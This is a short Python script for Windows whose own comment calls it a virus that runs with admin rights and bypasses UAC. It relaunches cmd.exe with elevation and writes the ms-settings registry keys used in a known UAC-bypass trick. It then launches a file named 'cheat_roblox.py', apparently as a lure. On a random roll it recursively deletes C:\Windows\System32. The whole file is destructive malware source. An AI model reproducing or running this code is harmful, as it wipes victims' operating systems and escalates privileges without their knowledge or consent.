import os
import time
import ctypes
import random
import shutil
# запускает вирус с админ правами без учета UAC👍👍👍
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def run_cmd_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", None, None, 1)

def add_to_registry():
    os.system('cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d "cmd.exe" /f')
    os.system('cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v "DelegateExecute" /t REG_SZ /f')

def start_cheat_roblox():
    os.system('cmd /c start python cheat_roblox.py')

def delete_system32():
    if random.randint(0, 6) == 1:
        shutil.rmtree("C:\\Windows\\System32", ignore_errors=True)

def main():
    run_cmd_as_admin()
    time.sleep(2)
    add_to_registry()
    start_cheat_roblox()
    delete_system32()

if __name__ == "__main__":
    main()